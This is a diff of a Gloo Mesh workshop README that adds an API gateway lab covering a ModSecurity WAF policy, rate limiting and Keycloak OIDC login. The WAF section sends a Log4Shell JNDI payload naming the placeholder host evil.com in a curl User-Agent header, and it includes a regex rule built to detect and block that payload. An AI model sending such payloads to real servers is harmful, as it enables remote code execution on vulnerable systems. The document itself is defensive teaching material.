@@ -1,9 +1,9 @@
-# Gloo Mesh Online Boutique Demo Workshop
-
 ![Gloo Mesh Enterprise](images/gloo-mesh-2.0-banner.png)
+
 # <center>Gloo Mesh Online Boutique Demo Workshop</center>
 
 ## Table of Contents
+
 * [Introduction](#introduction)
 * [Lab 1 - Deploy Kubernetes clusters](#Lab-1)
 * [Lab 2 - Deploy Gloo Mesh](#Lab-2)
@@ -16,11 +16,11 @@
 * [Lab 9 - Multicluster Failover](#Lab-9)
 * [Lab 10 - API Gateway](#Lab-10)
 
-## Introduction <a name="introduction"></a>
+## Introduction <a name="introduction" /></a>
 
 [Gloo Mesh Enterprise](https://www.solo.io/products/gloo-mesh/) is a distribution of [Istio Service Mesh](https://istio.io) with production support, CVE patching, FIPS builds, and a multi-cluster operational management plane to simplify running a service mesh across multiple clusters or a hybrid deployment. 
 
-Gloo Mesh also has enterprise features around multi-tenancy, global failover and routing, observability, and east-west rate limiting and policy enforcement (through AuthZ/AuthN plugins). 
+Gloo Mesh also has enterprise features around multi-tenancy, global failover and routing, observability, and east-west rate limiting and policy enforcement (through AuthZ/AuthN plugins).
 
 ![Gloo Mesh Value](images/gloo-mesh-value.png)
 
@@ -119,9 +119,7 @@ meshctl cluster register \
 ** Problems? ** 
 meshctl tries to automatically detect the management server endpoint, but sometimes this can fail. If that happens, it can be supplied manually. Follow the steps [here](problems-manual-registration.md) if you run into this.
 
-
 4. Verify Installation by opening the Gloo Mesh UI by running `meshctl dashboard`. Click [here](problems-dashboard.md) if that did not work.
-
 
 ## Lab 3 - Deploy Istio <a name="Lab-3"></a>
 
@@ -148,7 +146,6 @@ cat install/istio/istiooperator.yaml| envsubst | istioctl install --set hub=$IST
 
 3. Verify in the Gloo Mesh UI that Istio information is now being added.
 
-
 ## Lab 4 - Deploy Online Boutique <a name="Lab-4"></a>
 
 ![online-boutique](images/online-boutique.png)
@@ -166,7 +163,6 @@ kubectl apply --context $CLUSTER1 -f install/online-boutique/web-ui.yaml
 ```
 
 ## Lab 5 - Configure Gloo Mesh Workspaces <a name="Lab-5"></a>
-
 
 ![online-boutique](images/online-boutique-workspaces.png)
 
@@ -250,7 +246,6 @@ spec:
       trimProxyConfig: true
 EOF
 ```
-
 
 4. Apply the web-team WorkspaceSettings to the web-team namespace.
 
@@ -397,7 +392,6 @@ EOF
 ```
 
 2. Check the Online Boutique and see that pages are no longer loading correctly
-
 
 3. Add AccessPolicies to allow traffic from the frontend to the backend apis
 
@@ -705,6 +699,7 @@ EOF
 ![cluster2 header](images/cluster2-frontend-header.png)
 
 * Alternatively you can test this using curl
+
 ```sh
 for i in {1..6}; do curl -sSk http://$HTTP_GATEWAY_ENDPOINT | grep "Cluster Name:"; done
 ```
@@ -766,7 +761,6 @@ kubectl --context $CLUSTER1 -n web-ui patch deploy frontend --patch '{"spec":{"t
 
 9. Test failover to cluster2 frontend application
 
-
 * Optionally view the cluster failover using curl
 
 ```sh
@@ -783,15 +777,317 @@ kubectl wait pod -l app=frontend -n web-ui --context $CLUSTER1 --for condition=r
 
 11. Test that the frontend in cluster1 is working again
 
-
-
 ## Lab 10 - API Gateway <a name="Lab-10"></a>
 
-1. Deploy Keycloak
+In order to use the various features of the Gloo API gateway you will need to deploy the `Gloo Mesh Addons` package which has the components to use features such as `rate limiting` and `external authorization`.
+
+1. Install the `gloo-mesh-addons` package in cluster1
+
+```sh
+kubectl --context ${CLUSTER1} create namespace gloo-mesh-addons
+kubectl --context ${CLUSTER1} label namespace gloo-mesh-addons istio-injection=enabled
+
+helm upgrade --install gloo-mesh-agent-addons gloo-mesh-agent/gloo-mesh-agent \
+  --namespace gloo-mesh-addons \
+  --kube-context=${CLUSTER1} \
+  --set glooMeshAgent.enabled=false \
+  --set rate-limiter.enabled=true \
+  --set ext-auth-service.enabled=true \
+  --version $GLOO_MESH_VERSION
+```
+
+### 1. Add a web application firewall (WAF)
+
+Gloo Mesh Gateway utilizes OWASP ModSecurity to add WAF features into the ingress gateway. Not only can you enable the [OWASP Core Rule Set](https://owasp.org/www-project-modsecurity-core-rule-set/) easily, but also you can enable many other advanced features to protect your applications.
+
+In this section of the lab, take a quick look at how to prevent the `log4j` exploit that was discovered in late 2021. For more details, you can review the [Gloo Edge blog](https://www.solo.io/blog/block-log4shell-attacks-with-gloo-edge/) that this implementation is based on.
+
+**Before you begin**
+
+1. Refer to following diagram from Swiss CERT to learn how the `log4j` attack works. Note that a JNDI lookup is inserted into a header field that is logged.
+
+![log4j exploit](./images/log4j_attack.png)
+2. Confirm that a bad JNDI request currently succeeds. Note the `200` success response. Later, you create a WAF policy to block such requests.
+
+```sh
+curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" https://${ENDPOINT_HTTPS_GW_CLUSTER1}/
+```
+
+**WAF policy**
+With the Gloo Mesh WAF policy custom resource, you can create reusable policies for ModSecurity.
+
+3. Review the `log4j` WAF policy and the frontend route table. Note the following settings.
+
+  * In the route table, the frontend route has the label `waf: "true"`. The WAF policy applies to routes with this same lable.
+  * In the WAF policy config, the default core rule set is disabled. Instead, a custom rule set is created for the `log4j` attack.
+
+```yaml
+  cat << EOF | kubectl --context ${MGMT} apply -f -
+apiVersion: networking.gloo.solo.io/v2
+kind: RouteTable
+metadata:
+  name: frontend
+  namespace: web-team
+spec:
+  hosts:
+    - '*'
+  virtualGateways:
+    - name: north-south-gw
+      namespace: ops-team
+      cluster: mgmt
+  workloadSelectors: []
+  http:
+    - name: frontend
+      labels:
+        waf: "true"
+      forwardTo:
+        destinations:
+          - ref:
+              name: frontend
+              namespace: web-ui
+              cluster: cluster1
+            port:
+              number: 80
+---
+apiVersion: security.policy.gloo.solo.io/v2
+kind: WAFPolicy
+metadata:
+  name: log4jshell
+  namespace: web-team
+spec:
+  applyToRoutes:
+  - route:
+      labels:
+        waf: "true"
+  config:
+    disableCoreRuleSet: true
+    customInterventionMessage: 'Log4Shell malicious payload'
+    customRuleSets:
+    - ruleStr: |
+        SecRuleEngine On
+        SecRequestBodyAccess On
+        SecRule REQUEST_LINE|ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_BODY|REQUEST_HEADERS|XML:/*|XML://@*  
+          "@rx \${jndi:(?:ldaps?|iiop|dns|rmi)://" 
+          "id:1000,phase:2,deny,status:403,log,msg:'Potential Remote Command Execution: Log4j CVE-2021-44228'"
+EOF
+```
+
+4. Try the request again.
+
+```sh
+curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" https://${ENDPOINT_HTTPS_GW_CLUSTER1}/
+```
+
+Note that the is now blocked with the custom intervention message from the WAF policy. 
+
+```sh
+HTTP/2 403
+content-length: 27
+content-type: text/plain
+date: Wed, 18 May 2022 21:20:34 GMT
+server: istio-envoy
+
+Log4Shell malicious payload
+```
+
+Your frontend app is no longer susceptible to `log4j` attacks, nice!
+
+### 2. Add Rate Limiting
+
+Secondly, we will look at rate limiting with Gloo Mesh Gateway.  The rate limiting feature relies on a rate limit server that has been installed in our gloo-mesh-addons namespace.
+
+For rate limiting, we need to create three CRs.  Let's start with the `RateLimitClientConfig`.
+
+The `RateLimitClientConfig` defines the conditions in the request that will invoke rate limiting.  In this case, we will define a key coming from the header `X-Organization`.
+
+The `RateLimitPolicy` pulls together the `RateLimitClientConfig`, `RateLimitServerConfig` and sets the label selector to use in the `RouteTable`.
+
+* Apply the `RateLimitPolicy`
+
+```yaml
+cat << EOF | kubectl --context ${MGMT} apply -f -
+apiVersion: admin.gloo.solo.io/v2
+kind: RateLimitServerSettings
+metadata:
+  name: rate-limit-server-settings
+  namespace: web-team
+spec:
+  destinationServer:
+    port:
+      number: 8083
+    ref:
+      name: rate-limiter
+      namespace: gloo-mesh-addons
+      cluster: cluster1
+---
+apiVersion: trafficcontrol.policy.gloo.solo.io/v2
+kind: RateLimitClientConfig
+metadata:
+  name: rate-limit-client-config
+  namespace: web-team
+spec:
+  raw:
+    rateLimits:
+    - actions:
+      - genericKey:
+          descriptorValue: counter
+---
+apiVersion: admin.gloo.solo.io/v2
+kind: RateLimitServerConfig
+metadata:
+  name: rate-limit-server-config
+  namespace: web-team
+spec:
+  destinationServers:
+  - ref:
+      cluster: cluster1
+      name: rate-limiter
+      namespace: gloo-mesh-addons
+    port:
+      name: grpc
+  raw:
+    descriptors:
+    - key: generic_key
+      rateLimit:
+        requestsPerUnit: 3
+        unit: MINUTE
+      value: counter
+---
+apiVersion: trafficcontrol.policy.gloo.solo.io/v2
+kind: RateLimitPolicy
+metadata:
+  name: rate-limit-policy
+  namespace: web-team
+spec:
+  applyToDestinations:
+  - selector:
+      labels:
+        app: frontend
+  config:
+    serverSettings:
+      name: rate-limit-server-settings
+      namespace: web-team
+      cluster: mgmt
+    ratelimitClientConfig:
+      name: rate-limit-client-config
+      namespace: web-team
+      cluster: mgmt
+    ratelimitServerConfig:
+      name: rate-limit-server-config
+      namespace: web-team
+      cluster: mgmt
+    phase:
+      preAuthz: { }
+EOF
+```
+
+* Test Rate Limiting
+
+```sh
+for i in {1..6}; do curl -iksS -X GET https://${ENDPOINT_HTTPS_GW_CLUSTER1}/ | tail -n 10; done
+```
+
+* Expected Response - If you try the Online Boutique UI you will see a blank page because the rate-limit response is in the headers
+
+```sh
+HTTP/2 429
+x-envoy-ratelimited: true
+date: Sun, 05 Jun 2022 18:50:53 GMT
+server: istio-envoy
+x-envoy-upstream-service-time: 7
+```
+
+### 3. External Authorization (OIDC)
+
+Another valuable feature of API gateways is integration into your IdP (Identity Provider).  In this section of the lab, we see how Gloo Mesh Gateway can be configured to redirect unauthenticated users via OIDC.  We will use Keycloak as our IdP, but you could use other OIDC-compliant providers in your production clusters.
+
+
+First we need to deploy our OIDC server keycloak. We provided you with a script to deploy and configure keycloak for our workshop. 
+
+* Deploy and configure Keycloak
 
 ```sh
 export ENDPOINT_HTTPS_GW_CLUSTER1_EXT=$HTTP_GATEWAY_ENDPOINT
 ./install/keycloak/setup.sh
 ```
 
-2. 
+The `ExtAuthPolicy` defines the provider connectivity including any callback paths that we need to configure on our application.
+
+* View the `ExtAuthPolicy`
+
+```sh
+cat ./tracks/06-api-gateway/ext-auth-policy.yaml | envsubst
+```
+
+* Apply the `ExtAuthPolicy`
+
+```sh
+cat ./tracks/06-api-gateway/ext-auth-policy.yaml | envsubst | kubectl apply -n web-team --context $MGMT -f -
+```
+
+An `ExtAuthServer` is also required to define the external auth server destination we want to use.  We will use the ext-auth-server in the gloo-mesh-addons namespace.
+
+* Apply the `ExtAuthServer`
+
+```yaml
+cat << EOF | kubectl --context ${MGMT} apply -f -
+apiVersion: admin.gloo.solo.io/v2
+kind: ExtAuthServer
+metadata:
+  name: ext-auth-server
+  namespace: web-team
+spec:
+  destinationServer:
+    ref:
+      cluster: cluster1
+      name: ext-auth-service
+      namespace: gloo-mesh-addons
+    port:
+      name: grpc
+EOF
+```
+
+Associating this `ExtAuthPolicy` with the gateway `RouteTable` will ensure that the policy is enforced.
+
+* Apply the `RouteTable`
+
+```sh
+cat << EOF | kubectl --context ${MGMT} apply -f -
+apiVersion: networking.gloo.solo.io/v2
+kind: RouteTable
+metadata:
+  name: frontend
+  namespace: web-team
+spec:
+  hosts:
+    - '*'
+  virtualGateways:
+    - name: north-south-gw
+      namespace: ops-team
+      cluster: mgmt
+  workloadSelectors: []
+  http:
+    - name: main-page
+      labels:
+        oauth: "true"
+      forwardTo:
+        destinations:
+          - ref:
+              name: frontend
+              namespace: web-ui
+              cluster: cluster1
+            port:
+              number: 80
+EOF
+```
+
+Now if you refresh the application, you should be redirected to Keycloak to login.
+
+* Login using the following credentials
+
+```sh
+user: gloo-mesh
+password: solo
+```
+
+And the application is now accessible.
